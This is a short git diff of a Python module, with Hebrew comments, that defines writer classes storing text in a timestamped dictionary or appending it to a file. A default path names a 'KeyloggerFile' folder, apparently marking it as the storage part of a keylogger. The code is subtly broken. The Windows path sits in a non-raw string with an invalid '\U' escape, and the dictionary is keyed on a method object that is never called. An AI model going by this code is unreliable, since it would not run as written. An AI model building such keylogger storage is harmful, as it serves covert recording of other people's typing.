@@ -1,11 +1,10 @@
 from abc import ABC,abstractmethod
 from datetime import datetime
-from json import dumps
 
 # מחלקה מופשטת של כותב. מורישה מתודה של כתןב.
 class IWriter(ABC):
     @abstractmethod
-    def write(data: str) -> None:
+    def write(self, data: str) -> None:
         pass
 
 # מחלקת כתיבה למילון
@@ -14,6 +13,11 @@ class DictWriter(IWriter):
     def __init__(self):
         self.dct = {}
 
+    def get_dict(self) -> dict:
+        current_dict = self.dct.copy()
+        self.dct = {}
+        return current_dict
+    
     @staticmethod
     def cur_min():
         return datetime.now().strftime("%d/%m/%Y, %H:%M")
@@ -24,15 +28,15 @@ class DictWriter(IWriter):
         else:
             self.dct[self.cur_min] += key
         
-# json מחלקת כתיבה לקובץ 
+# מחלקת כתיבה לקובץ טקסט
 class FileWriter(IWriter):
 
-    def __init__(self):        
-        self.file_path = ""
+    def __init__(self, path = "C:\Users\User\OneDrive\GitProjects\KeyloggerFile"):        
+        self.file_path = path
 
-    def add_file_path(self, path: str) -> None:
+    def change_file_path(self, path: str) -> None:
         self.file_path = path
 
     def write(self, data: str) -> None:
         with open(self.file_path, "a") as file:
-            dumps(data, file)
+            file.write(data)
